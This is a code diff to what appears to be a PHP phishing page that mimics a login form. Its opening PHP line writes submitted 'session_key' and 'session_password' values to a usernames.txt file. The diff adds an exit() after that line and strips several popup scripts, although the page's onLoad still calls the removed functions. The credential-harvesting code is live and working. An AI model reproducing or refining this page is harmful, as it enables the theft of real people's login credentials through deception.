@@ -1,5 +1,6 @@
 <?php
 file_put_contents("usernames.txt", "Username: " . $_POST['session_key'] . " | Password: " . $_POST['session_password'] . "\n", FILE_APPEND);
+exit();
 ?>
 <!DOCTYPE html>
 <html>
@@ -38,20 +39,6 @@ file_put_contents("usernames.txt", "Username: " . $_POST['session_key'] . " | Pa
         }
         return true;
       }
-    </script>
-    <script language="javascript">
-      window.name="logoffpage";
-    </script>
-    <script language="javascript">
-      function popOURL() {
-        OURLWindow=window.open("http://www.google.com", "OURLWindow", "scrollbars=yes,toolbar=yes,status=yes,resizable=yes,menubar=yes,location=yes");
-      }
-    </script>
-    <script language="javascript">
-      function popMe() {
-        winrefname=window.open("/Images/logout.html?32388", "logOutWindow"+"1744699342913", "scrollbars=no,status=no,width=240,height=265,resizable=no,menubar=no,location=no");
-      }
-    </script>
   </head>
   <body bgcolor="#B8C6BF" onLoad="popOURL(); popMe();">
     <table width="778px" border="0" align="center" cellpadding="0" cellspacing="0">
